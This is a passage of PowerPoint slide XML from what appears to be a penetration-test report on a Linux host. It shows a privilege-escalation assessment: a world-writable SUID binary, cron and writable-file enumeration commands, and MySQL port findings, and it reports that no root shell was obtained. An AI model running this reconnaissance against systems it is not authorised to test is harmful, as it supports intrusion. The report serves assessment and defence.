            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3611880"/>
            <a:ext cx="5349240" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9412"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3611880"/>
            <a:ext cx="4937760" cy="77724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-rwsrwxrwx   4777   owner: defender</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6117336" y="1362456"/>
            <a:ext cx="5550408" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3306"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Image 0" descr="/home/claude/report_imgs/fig8_suid_binary.jpg">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="5440680" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3593592"/>
            <a:ext cx="5440680" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Figure 7 — SUID, ownership, and world-writable permissions confirmed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3977640"/>
            <a:ext cx="5440680" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SUID = executes with the file OWNER's privileges, not the caller's</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>world-writable + SUID + non-root owner = classic escalation pattern</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4892040"/>
            <a:ext cx="5349240" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="4983480"/>
            <a:ext cx="5020056" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ /home/defender/Downloads/.shelf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ id</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4892040"/>
            <a:ext cx="5440680" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5926"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="5029200"/>
            <a:ext cx="4983480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RESULT: still www-data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="5394960"/>
            <a:ext cx="4983480" cy="640080"/>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SUID misconfiguration CONFIRMED. Successful privilege escalation NOT demonstrated in this engagement.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18</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08 · PRIVILEGE ESCALATION ASSESSMENT</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Additional Privilege-Escalation Checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="11064240" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7619"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1554480"/>
            <a:ext cx="5120640" cy="457200"/>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ps auxww</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="1554480"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Running processes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="1554480"/>
            <a:ext cx="3246120" cy="777240"/>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Look for root processes doing something exploitable (e.g., predictable scheduled jobs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2496312"/>
            <a:ext cx="11064240" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7619"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2587752"/>
            <a:ext cx="5120640" cy="457200"/>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cat /etc/cron.d/php ; cat /etc/cron.d/anacron</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="2587752"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Root cron jobs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="2587752"/>
            <a:ext cx="3246120" cy="777240"/>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A root-run cron job pointing at a file we can write would be an escalation path.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3529584"/>
            <a:ext cx="11064240" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7619"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3621024"/>
            <a:ext cx="5120640" cy="457200"/>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find /home/defender -maxdepth 3 -type f -writable 2&gt;/dev/null</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3621024"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Writable files owned by defender</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="3621024"/>
            <a:ext cx="3246120" cy="777240"/>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Any writable file owned by a higher-privileged account is a potential foothold.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4562856"/>
            <a:ext cx="11064240" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7619"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4654296"/>
            <a:ext cx="5120640" cy="457200"/>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find / -writable -type f 2&gt;/dev/null | grep -vE '^/(proc|sys|dev)'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="4654296"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Writable files, system-wide</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275320" y="4654296"/>
            <a:ext cx="3246120" cy="777240"/>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Broadest possible sweep for anything else writable outside noisy virtual filesystems.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5577840"/>
            <a:ext cx="11064240" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8889"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5687568"/>
            <a:ext cx="10515600" cy="256032"/>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RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5961888"/>
            <a:ext cx="10515600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No writable root cron path  •  No additional useful writable files  •  No root shell obtained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19</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09 · SERVICE-SPECIFIC ASSESSMENT</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MySQL Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="5349240" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1600200"/>
            <a:ext cx="4892040" cy="256032"/>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EXPOSED PORTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1920240"/>
            <a:ext cx="4892040" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3306/tcp — MySQL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>33060/tcp — MySQL X Protocol</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3108960"/>
            <a:ext cx="5349240" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KEY PRINCIPLE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
